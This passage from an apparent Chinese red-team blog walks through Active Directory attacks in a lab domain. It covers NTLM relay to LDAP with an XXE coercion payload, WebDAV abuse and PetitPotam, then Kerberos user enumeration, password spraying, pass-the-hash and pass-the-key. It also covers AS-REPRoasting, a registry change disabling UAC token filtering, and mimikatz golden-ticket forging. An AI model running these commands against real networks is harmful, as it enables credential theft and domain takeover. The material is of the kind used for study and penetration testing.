alt=\"image-20250520044458393\"></p>\n<p>开启relay</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-ntlmrelayx -t ldap:&#x2F;&#x2F;&lt;dc-ip&gt; --delegate-access --escalate-user &#39;TEST$&#39;</span><br></pre></td></tr></table></figure>\n\n<p>发起XXE</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PROPFIND &#x2F;webdav&#x2F; HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 192.168.30.20:8080</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 249</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE propertyupdate [</span><br><span class=\"line\">&lt;!ENTITY loot SYSTEM &quot;http:&#x2F;&#x2F;192.168.30.40&#x2F;&quot;&gt; ]&gt;</span><br><span class=\"line\">&lt;D:propertyupdate</span><br><span class=\"line\">    xmlns:D&#x3D;&quot;DAV:&quot;&gt;</span><br><span class=\"line\">    &lt;D:set&gt;</span><br><span class=\"line\">        &lt;D:prop&gt;</span><br><span class=\"line\">            &lt;a</span><br><span class=\"line\">                xmlns&#x3D;&quot;http:&#x2F;&#x2F;192.168.30.40&#x2F;&quot;&gt;&amp;loot;</span><br><span class=\"line\">            &lt;&#x2F;a&gt;</span><br><span class=\"line\">        &lt;&#x2F;D:prop&gt;</span><br><span class=\"line\">    &lt;&#x2F;D:set&gt;</span><br><span class=\"line\">&lt;&#x2F;D:propertyupdate&gt;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"WebDAV\"><a href=\"#WebDAV\" class=\"headerlink\" title=\"WebDAV\"></a>WebDAV</h4><p>原理文章：<a href=\"https://whoamianony.top/posts/privilege-escalation-ntlmrelay2self-over-http-webdav/\">Privilege Escalation - NTLM Relay over HTTP (Webdav)</a></p>\n<p>因为 SMB 协议导致协商签名的服务器对 NTLM 认证请求强制签名的原因，让攻击角度转向了那些不支持签名的客户端，例如 HTTP、WebDAV等</p>\n<p>WebDAV（Web-based Distributed Authoring and Versioning，基于 Web 的分布式编写和版本控制）是一种基于 HTTP 的通信协议，扩展了几个 HTTP 标准方法，在强制身份验证中，我们可以通过 WebDAV 代替 SMB，并通过以下格式的 UNC 路径访问攻击者的 HTTP 服务器，<strong>从而在 Relay To LDAP/s 中绕过签名</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\\\evilhost@80\\webdav\\test.txt</span><br></pre></td></tr></table></figure>\n\n<p>当对启用 WebDAV 的 UNC 路径触发文件操作时，客户端主机将与 WebDAV 服务器执行如下交互过程：</p>\n<ol>\n<li>客户端发出一个 OPTIONS 方法来发现服务器支持的请求方法</li>\n<li>如果支持 PROPFIND 方法，则发出 PROPFIND 请求来发现目录结构</li>\n<li>如果服务器以 401 Unauthorized 响应并通过 WWW-Authenticate 标头请求 NTLM 身份验证，则 WebDAV 将继续启动 NTLM 质询响应身份验证，最终将 Net-NTLM Hash 提供给服务器</li>\n</ol>\n<p>尽管安装并启用 WebClient 服务是 Workstation 版本系统上的默认设置，但并不适用于 Server 版本系统。在 Server 版本系统上，我们仍然需要通过附加功能来安装并启用 WebDAV 组件。但是低权限用户仍然可以通过调用服务控制管理器（Services Control Manager，SCM）来启动 WebClient 服务：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;evntprov.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">void StartWebClientService()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tREGHANDLE hReg;</span><br><span class=\"line\">\tbool success &#x3D; false;</span><br><span class=\"line\">\tconst GUID WebClientServiceTrigger &#x3D;</span><br><span class=\"line\">\t&#123; 0x22B6D684, 0xFA63, 0x4578,</span><br><span class=\"line\">\t&#123; 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7 &#125; &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (EventRegister(&amp;WebClientServiceTrigger, NULL, NULL, &amp;hReg) &#x3D;&#x3D; ERROR_SUCCESS)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tEVENT_DESCRIPTOR eDesc;</span><br><span class=\"line\">\t\tEventDescCreate(&amp;eDesc, 1, 0, 0, 4, 0, 0, 0);</span><br><span class=\"line\">\t\tsuccess &#x3D; EventWrite(hReg, &amp;eDesc, 0, nullptr) &#x3D;&#x3D; ERROR_SUCCESS;</span><br><span class=\"line\">\t\tEventUnregister(hReg);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; Now wait for the service to be running</span><br><span class=\"line\"></span><br><span class=\"line\">\tSC_HANDLE schSCM;</span><br><span class=\"line\">\tSC_HANDLE schSvc;</span><br><span class=\"line\">\tSERVICE_STATUS ssStatus;</span><br><span class=\"line\">\tschSCM &#x3D; OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);</span><br><span class=\"line\">\tif (NULL &#x3D;&#x3D; schSCM)</span><br><span class=\"line\">\t\tprintf(&quot;[-] Failed OpenSCManager: %d\\n&quot;, GetLastError());</span><br><span class=\"line\"></span><br><span class=\"line\">\tschSvc &#x3D; OpenService(schSCM, L&quot;WebClient&quot;, SERVICE_QUERY_STATUS);</span><br><span class=\"line\">\tif (NULL &#x3D;&#x3D; schSvc)</span><br><span class=\"line\">\t\tprintf(&quot;[-] Failed OpenService: %d\\n&quot;, GetLastError());</span><br><span class=\"line\">\tdo</span><br><span class=\"line\">\t\tQueryServiceStatus(schSvc, &amp;ssStatus);</span><br><span class=\"line\">\twhile (ssStatus.dwCurrentState !&#x3D; SERVICE_RUNNING);</span><br><span class=\"line\">\tprintf(&quot;[*] WebClient service started.\\n&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">\tCloseServiceHandle(schSvc);</span><br><span class=\"line\">\tCloseServiceHandle(schSCM);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tStartWebClientService();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在内网对服务进行探测</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">crackmapexec smb 192.168.30.0&#x2F;24 -u tom -p Ab123456 -d test.com  -M webdav</span><br></pre></td></tr></table></figure>\n\n<p>为了能让开启了 WebClient 服务的客户端成功访问到我们，我们需要通过已获取的域用户权限，<strong>在域内为攻击机添加一个 DNS 记录</strong>。因为在默认情况下，WebClient 仅对本地内部网（Local Intranet）或受信任的站点（Trusted Sites）列表中的目标进行身份验证</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 dnstool.py -u test.com\\\\tom -p Ab123456 -r evil.test.com -d &lt;kali ip&gt; --action add DC-1.test.com</span><br><span class=\"line\">python3 dnstool.py -u test.com\\\\tom -p Ab123456 -r evil.test.com -a query DC-1.test.com</span><br></pre></td></tr></table></figure>\n\n<p>攻击机开启ntlmrelayx</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-ntlmrelayx -t ldap:&#x2F;&#x2F;&lt;dc-ip&gt; --delegate-access --escalate-user &#39;TEST$&#39; --no-dump</span><br></pre></td></tr></table></figure>\n\n<p>PetitPotam强制认证</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-PetitPotam -d test.com -dc-ip &lt;dc-ip&gt; -u tom -p Ab123456 &lt;kali&gt; &lt;target&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Kerberos-Relay-to-LDAP\"><a href=\"#Kerberos-Relay-to-LDAP\" class=\"headerlink\" title=\"Kerberos Relay to LDAP\"></a>Kerberos Relay to LDAP</h3><p>参考文章:</p>\n<p><a href=\"https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html\">https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html</a></p>\n<p><a href=\"https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html\">https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html</a></p>\n<p><a href=\"https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/\">https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/</a></p>\n<p><a href=\"https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9\">https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9</a></p>\n<p><a href=\"https://github.com/ShorSec/KrbRelayUp\">https://github.com/ShorSec/KrbRelayUp</a></p>\n<blockquote>\n<p>大概意思好像是可以通过 DCOM 或者 DNS 触发 Kerberos Relay, 并使用当前机器账户的 ST 中继至 LDAP 服务从而配置 RBCD/Shadow Credentials</p>\n</blockquote>\n<p>后续研究 Kerberos Relay 再补充</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>委派：</p>\n<p>⭐ <a href=\"https://labs.lares.com/fear-kerberos-pt4/\">Kerberos IV - Delegations</a></p>\n<p>⭐ <a href=\"https://www.chudamax.com/posts/kerberos-102-delegation/\">Kerberos 102 - Delegation</a></p>\n<p><a href=\"https://www.anquanke.com/post/id/173477\">Kerberos协议探索系列之委派篇</a></p>\n<p><a href=\"https://trya9ain.github.io/posts/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/\">约束委派</a></p>\n<p><a href=\"https://ruyueattention.github.io/2022/06/24/%E5%9F%9F%E5%A7%94%E6%B4%BE/\">域委派的原理与利用</a></p>\n<p><a href=\"https://y4er.com/posts/kerberos-unconstrained-delegation/\">Kerberos协议之非约束委派</a></p>\n<p><a href=\"https://y4er.com/posts/kerberos-constrained-delegation/\">Kerberos协议之约束委派</a></p>\n<p>委派攻击利用：</p>\n<p>⭐ <a href=\"https://forum.butian.net/share/1591\">红队域渗透技术：委派攻击汇总（全）</a></p>\n<p>⭐ <a href=\"https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/01.%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/08.%E5%A7%94%E6%B4%BE.html\">委派-D4M1TS</a></p>\n<p>⭐ <a href=\"https://blog.zjun.info/tech/kerberos-domain-delegation-attack/\">Kerberos 域委派攻击</a></p>\n<p>⭐ <a href=\"https://xz.aliyun.com/news/11001\">域渗透之委派攻击全集</a></p>\n<p>⭐ <a href=\"https://exp10it.io/2023/08/resource-based-constrained-delegation-attack-summary/\">基于资源的约束委派 (RBCD) 利用总结</a></p>\n<p><a href=\"https://shu1l.github.io/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/\">kerberos域委派攻击学习</a></p>\n<p><a href=\"https://www.freebuf.com/articles/network/370073.html\">一篇文章讲清楚什么是委派攻击</a></p>\n<p><a href=\"https://whoamianony.top/posts/domain-delegation-attack/\">Abusing Domain Delegation to Attack Active Directory</a></p>\n","categories":["内网渗透"]},{"title":"Kerberos Attacks - Kerberos攻击面","url":"/2025/06/12/Kerberos%E6%94%BB%E5%87%BB%E9%9D%A2/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250129140706755.png\" alt=\"image-20250129140706755\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"攻击面\"><a href=\"#攻击面\" class=\"headerlink\" title=\"攻击面\"></a>攻击面</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">AS_REQ &amp; AS_REP：PTK、PTH、用户名枚举、密码喷洒、AS-REPRoasting、黄金票据</span><br><span class=\"line\"></span><br><span class=\"line\">TGS_REQ &amp; TGS_REP：PTT、kerberosting、白银票据</span><br><span class=\"line\"></span><br><span class=\"line\">S4U：非约束委派、约束委派、基于资源的约束委派</span><br><span class=\"line\"></span><br><span class=\"line\">PAC：ms14068、noPAC</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"AS-REQ-amp-AS-REP\"><a href=\"#AS-REQ-amp-AS-REP\" class=\"headerlink\" title=\"AS_REQ &amp; AS_REP\"></a>AS_REQ &amp; AS_REP</h1><h2 id=\"有效域用户枚举\"><a href=\"#有效域用户枚举\" class=\"headerlink\" title=\"有效域用户枚举\"></a>有效域用户枚举</h2><p>攻击原理：在AS-REQ阶段，请求包中的cname字段为用户名，<strong>根据返回包的状态不同判断该用户是否存在</strong>，有如下状态码，在域内域外皆可枚举</p>\n<table>\n<thead>\n<tr>\n<th>AS-REP 回复包状态</th>\n<th>Kerberos 错误信息</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>用户存在 且启用</td>\n<td>KDC_ERR_PREAUTH_REQUIRED (需要额外的预认证)</td>\n</tr>\n<tr>\n<td>用户存在 但禁用</td>\n<td>KDC_ERR_CLIENT_REVOKED NT Status： STATUS_ACCOUNT_DISABLED (用户状态不可用)</td>\n</tr>\n<tr>\n<td>用户不存在</td>\n<td>KDC_ERR_C_PRINCIPAL_UNKNOWN (找不到此用户)</td>\n</tr>\n</tbody></table>\n<p>tom存在且启用，返回 <code>KDC_ERR_PREAUTH_REQUIRED</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250129154528257.png\" alt=\"image-20250129154528257\"></p>\n<p>不存在用户，返回 <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250129154912842.png\" alt=\"image-20250129154912842\"></p>\n<p><strong>工具：</strong></p>\n<p><strong>1. Kerbrute</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kerbrute.exe userenum --dc 192.168.100.128 -d test.com usernames.txt -t 10 -o output.txt</span><br></pre></td></tr></table></figure>\n\n<p><strong>2. pyKerbrute</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#tcp 模式</span><br><span class=\"line\">python2 EnumADUser.py 10.211.55.4 xie.com user.txt tcp</span><br><span class=\"line\">#udp 模式</span><br><span class=\"line\">python2 EnumADUser.py 10.211.55.4 xie.com user.txt udp</span><br></pre></td></tr></table></figure>\n\n<p>tips:</p>\n<p>Kerbrute枚举用户名是通过固定密码foobar，能否作为检测特征</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">func (k KerbruteSession) TestUsername(username string) (bool, error) &#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; client here does NOT assume preauthentication (as opposed to the one in TestLogin)</span><br><span class=\"line\"></span><br><span class=\"line\">\tcl :&#x3D; kclient.NewWithPassword(username, k.Realm, &quot;foobar&quot;, k.Config, kclient.DisablePAFXFAST(true))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"密码喷洒-爆破\"><a href=\"#密码喷洒-爆破\" class=\"headerlink\" title=\"密码喷洒/爆破\"></a>密码喷洒/爆破</h2><p>攻击原理：在AS-REQ阶段根据认证返回包状态不同进行密码的喷洒和爆破</p>\n<p>密码喷洒：固定密码，跑用户名。密码爆破：固定用户名，跑密码。</p>\n<p>用户密码错误，返回 <code>KRB5KDC_ERR_PREAUTH_FAILED</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250129154528257.png\" alt=\"image-20250129154528257\"></p>\n<p>用户密码正确返回正常的AS-REP包</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250129161643745.png\" alt=\"image-20250129161643745\"></p>\n<p><strong>工具：</strong></p>\n<p><strong>1. Kerbrute</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">喷洒</span><br><span class=\"line\">kerbrute.exe passwordspray --dc 10.211.55.4 -d xie.com user.txt P@ssw0rd</span><br><span class=\"line\"></span><br><span class=\"line\">爆破</span><br><span class=\"line\">kerbrute.exe bruteuser --dc 10.211.55.4 -d xie.com pass.txt administrator</span><br></pre></td></tr></table></figure>\n\n<p><strong>2. pyKerbrute</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#针对明文进行喷洒，tcp 模式和 udp 模式</span><br><span class=\"line\">python2 ADPwdSpray.py 10.211.55.4 xie.com user.txt clearpassword P@ssw0rd tcp</span><br><span class=\"line\">python2 ADPwdSpray.py 10.211.55.4 xie.com user.txt clearpassword P@ssw0rd udp</span><br><span class=\"line\"></span><br><span class=\"line\">#针对哈希进行喷洒，tcp 模式和 udp 模式</span><br><span class=\"line\">python2 ADPwdSpray.py 10.211.55.4 xie.com user.txt ntlmhash e19ccf75ee54e06b06a5907af13cef42 tcp</span><br><span class=\"line\">python2 ADPwdSpray.py 10.211.55.4 xie.com user.txt ntlmhash e19ccf75ee54e06b06a5907af13cef42 udp</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"PTH\"><a href=\"#PTH\" class=\"headerlink\" title=\"PTH\"></a>PTH</h2><p>攻击原理：NTLM 认证过程和 Kerberos 认证过程都支持使用用户密码的 NTLM Hash 来进行加密，当抓取到用户的hash后可以直接去进行认证而跳过密码认证。</p>\n<p>在Windows Server2012 及其以后的机器，默认不会在内存中保存明文密码，需要PTH横向</p>\n<p><strong>由于UAC的限制</strong>，不同的账户类型PTH结果也会失败或成功：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">账户描述</th>\n<th align=\"left\">PTH结果</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">pubcli_user：本地普通用户</td>\n<td align=\"left\">失败</td>\n</tr>\n<tr>\n<td align=\"left\">test：本地管理员组用户</td>\n<td align=\"left\">失败</td>\n</tr>\n<tr>\n<td align=\"left\">Administrator：本地管理员组用户</td>\n<td align=\"left\">成功</td>\n</tr>\n<tr>\n<td align=\"left\">xie\\hack：域用户 &amp;&amp; 本地管理员组用户</td>\n<td align=\"left\">成功</td>\n</tr>\n</tbody></table>\n<p>当 <strong>内置管理员账户 Administrator</strong> 进行远程连接时会直接得到具有管理员凭证的令牌，而 <strong>非Administrator 的本地管理员账户</strong> 进行远程连接时，会得到一个删除了管理员凭证的令牌。而 <strong>本地管理员组中的域用户</strong> 进行远程连接时，UAC 不会生效，会直接得到一个具有管理员凭证的令牌。</p>\n<p><strong>工具：</strong></p>\n<p><strong>1. CrackMapExec</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">crackmapexec smb 10.211.55.0&#x2F;24 -u Administrator -H 329153f560eb329c0e1deea55e88a1e9 -x whoami</span><br></pre></td></tr></table></figure>\n\n<p><strong>2. mimikatz</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">privilege::debug</span><br><span class=\"line\">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:10.211.55.7 &#x2F;ntlm:329153f560eb329c0e1deea55e88a1e9</span><br></pre></td></tr></table></figure>\n\n<p><strong>3. impacket</strong></p>\n<p>psexec、smbexec、wmiexec、atexec、dcomexec等exec脚本</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 psexec.py administrator@10.211.55.7 -hashes :329153f560eb329c0e1deea55e88a1e9</span><br></pre></td></tr></table></figure>\n\n<p><strong>4. evil-winrm</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">evil-winrm -i 192.168.1.10 -u Administrator -H &lt;NTLM_HASH&gt;</span><br></pre></td></tr></table></figure>\n\n<p>tips：</p>\n<p>让 <strong>非Administrator 的本地管理员账户</strong> 进行远程连接时也得到一个具有管理员凭证的令牌，使其PTH成功</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"PTK\"><a href=\"#PTK\" class=\"headerlink\" title=\"PTK\"></a>PTK</h2><p>在kerberos的AS-REQ阶段，预认证要求用户提供 <strong>从用户密码派生的密钥</strong>，Kerberos 提供 4 种不同的密钥类型：<strong>DES、RC4、AES-128 和 AES-256</strong></p>\n<p>攻击原理：当启用RC4时，RC4 密钥实际上是用户的 NT 哈希，这种攻击方式叫PTH。当RC4被禁用时，其他 Kerberos 密钥（DES、AES-128、AES-256）也可以传递，这种攻击技术称为PTK。二者仅仅是传递的密钥不同。由于其他密钥如AES256是在kerberos协议中，因此 <strong>PTK的利用环境为：开启了aes认证的域环境中</strong></p>\n<p>微软发布了针对 Pass The Hash 哈希传递攻击的更新补丁 <strong>KB2871997</strong>，引入了一些安全机制</p>\n<ul>\n<li>Protected Users 组的支持</li>\n<li>Restricted Admin RDP 模式远程客户端支持</li>\n<li>Pass The Hash 增强保护</li>\n</ul>\n<p><strong>工具：</strong></p>\n<p><strong>1. mimikatz</strong></p>\n<p>当拿下一台域内主机时，dump下aeskey，然后通过该凭证去尝试登录其他机器</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::ekeys&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n\n<p>导入aes key</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth &#x2F;user:tom &#x2F;domain:test.com &#x2F;aes256:0b387bfe557dbd745c08721d3fc5440c9e63a97f7c4fd9eb1085ee3e472af12c&quot;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"AS-REPRoasting\"><a href=\"#AS-REPRoasting\" class=\"headerlink\" title=\"AS-REPRoasting\"></a>AS-REPRoasting</h2><p>攻击原理：域内某些账号设置了 <strong>不要求 kerberos 预身份验证</strong>，因此不需要AS-REQ的预身份验证，直接向域控的 88 Kerberos 端口去请求票据，这时AS-REP就会返回 <strong>TGT、用户hash加密的session key</strong>，对内容重新组合能够拼接成 Kerberos 5 AS-REP etype 23(18200) 的格式，针对被加密的session key进行<strong>本地离线破解，从而爆破出用户密码</strong></p>\n<hr>\n<p><strong>域内机器利用思路：</strong>直接ldap查询出域内不需要身份认证的用户</p>\n<p>通过adfind或者adexplorer查询域内信息满足 <code>(userAccountControl:1.2.840.113556.1.4.803:=4194304)</code> 的用户</p>\n<p>adfind查询</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">adfind -h 192.168.100.128:389 -u test.com\\tom -up Ab123456 -f &quot;useraccountcontrol:1.2.840.113556.1.4.803:&#x3D;4194304&quot; -dn</span><br></pre></td></tr></table></figure>\n\n<p>adexplorer中,由于userAccountControl的值为叠加查询属性值大于或等于4194304的用户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">adexplorer64.exe -snapshot &quot;&quot; test.dat</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250204163504951.png\" alt=\"image-20250204163504951\"></p>\n<p><strong>非域内机器利用思路：</strong>如果有域内账号凭证，利用凭证查询出不需要身份认证的用户；如果没有域内账号凭证，利用大量用户名字典先去有效用户枚举，再去探测不需要身份认证的用户</p>\n<p><strong>工具：</strong></p>\n<p><strong>1. Rubeus</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Rubeus.exe asreproast &#x2F;format:john &#x2F;outfile:hashs.txt</span><br></pre></td></tr></table></figure>\n\n<p><strong>2. impacket</strong></p>\n<p>GetNPUsers.py用于尝试获得并列出不需要Kerberos域认证的用户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 域外机器无凭证盲爆用户</span><br><span class=\"line\">python GetNPUsers.py -usersfile users.txt -outputfile hashs.txt -dc-ip 192.168.100.128 -format hashcat</span><br><span class=\"line\"></span><br><span class=\"line\"># 域外机器有凭证</span><br><span class=\"line\">python GetNPUsers.py -outputfile hashs.txt -dc-ip 192.168.100.128 -format hashcat test&#x2F;tom:Ab123456</span><br><span class=\"line\">python GetNPUsers.py -outputfile hashs.txt -dc-ip 192.168.100.128 -format hashcat -request test&#x2F;tom:Ab123456</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250204171557999.png\" alt=\"image-20250204171557999\"></p>\n<p><strong>本地爆破：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">john --wordlist&#x3D;pass.txt hashs.txt</span><br><span class=\"line\">hashcat -m 18200 hashs.txt pass.txt --force --show</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"黄金票据\"><a href=\"#黄金票据\" class=\"headerlink\" title=\"黄金票据\"></a>黄金票据</h2><p>攻击原理：在AS-REP阶段，返回的TGT加密部分是由krbtgt用户的密钥加密的，<strong>如果获得了krbtgt的密钥，就可以伪造签发TGT票据，再去发起TGS请求，从而访问任意服务</strong>，该票据被称为黄金票据（GoldenTicket）</p>\n<hr>\n<p><strong>黄金票据特点：</strong></p>\n<ul>\n<li><p>域控中<strong>KDC服务在20分钟内不验证TGT中的用户帐户</strong>，这意味在这时间内可以使用 <strong>被禁用、被删除、不存在</strong> 的帐户（KB5008380后域用户必须存在！）</p>\n</li>\n<li><p>域控上由KDC服务配置的Kerberos策略：如果提供票据，则系统信任票据的有效性。这意味着，即使域策略声明Kerberos登录票据（TGT）只有10小时有效，如果票据声明有效期为10 年，那么也会信任票据的有效性期为10年</p>\n</li>\n<li><p>该KRBTGT帐户密码从不更改和直到KRBTGT密码被更改（两次），攻击者可以创建黄金票据。请注意，即使伪造用户更改其密码，创建用于模拟用户的Golden Ticket仍然存在</p>\n</li>\n<li><p>它绕过了SmartCard身份验证要求，因为它绕过了DC在创建TGT之前执行的常规验证</p>\n</li>\n<li><p>金票可用于模拟任何用户访问Active Directory中的任何资源</p>\n</li>\n<li><p>在主机上都可以生成和使用黄金票据（TGT），即使没有加入域，只要网络可以访问域</p>\n</li>\n</ul>\n<p><strong>制作金票条件：</strong></p>\n<ul>\n<li>域名称</li>\n<li>域的SID值</li>\n<li>域用户 krbtgt 的 NTLM Hash 或 AES-256 或 AES-128</li>\n<li>伪造的任意用户名</li>\n</ul>\n<hr>\n<p><strong>攻击步骤：</strong></p>\n<p>一、获取所需条件信息</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">域名：test.com</span><br><span class=\"line\">域SID：S-1-5-21-3222783777-1006235836-3661351843</span><br><span class=\"line\">krbtgt：mimikatz.exe log &quot;lsadump::dcsync &#x2F;domain:test.com &#x2F;user:krbtgt&quot; exit</span><br><span class=\"line\">\t\t# Hash NTLM: 2cab196e52f4b152337ab1e4d3242923</span><br><span class=\"line\">\t\t# aes256_hmac: 2f526bb9eea0dc4a19f0023a8f91921ee822429873c8203865f3d3237c49a8b1</span><br><span class=\"line\">伪造的任意用户名：Administrator</span><br></pre></td></tr></table></figure>\n\n<p>二、工具</p>\n<p><strong>1. Mimikatz</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 列出当前票据</span><br><span class=\"line\">kerberos::list</span><br><span class=\"line\"># 清空票据</span><br><span class=\"line\">kerberos::purge</span><br><span class=\"line\"># 直接注入伪造</span><br><span class=\"line\">kerberos::golden &#x2F;user:hacker &#x2F;domain:test.com &#x2F;sid:S-1-5-21-... &#x2F;rc4:2cab196e5... &#x2F;ptt</span><br><span class=\"line\">or</span><br><span class=\"line\">kerberos::golden &#x2F;user:hacker &#x2F;domain:test.com &#x2F;sid:S-1-5-21-... &#x2F;aes256:2f526bb9eea... &#x2F;ptt</span><br><span class=\"line\">or</span><br><span class=\"line\">kerberos::golden &#x2F;admin:hacker &#x2F;domain:test.com &#x2F;sid:S-1-5-21-... &#x2F;krbtgt:2cab196e5... &#x2F;ptt</span><br><span class=\"line\">or</span><br><span class=\"line\">kerberos::golden &#x2F;user:Administrator &#x2F;domain:test.com &#x2F;sid:S-1-5-21-... &#x2F;krbtgt:2cab196e5... &#x2F;ptt</span><br><span class=\"line\"></span><br><span class=\"line\"># 验证金票</span><br><span class=\"line\">dir \\\\DC-1\\C$</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250213025748716.png\" alt=\"image-20250213025748716\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250213030129685.png\" alt=\"image-20250213030129685\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;domain - 完整的域名，在这个例子中：test.com</span><br><span class=\"line\">&#x2F;sid - 域的SID,在这个例子中：S-1-5-21-1473643419-774954089-2222329127</span><br><span 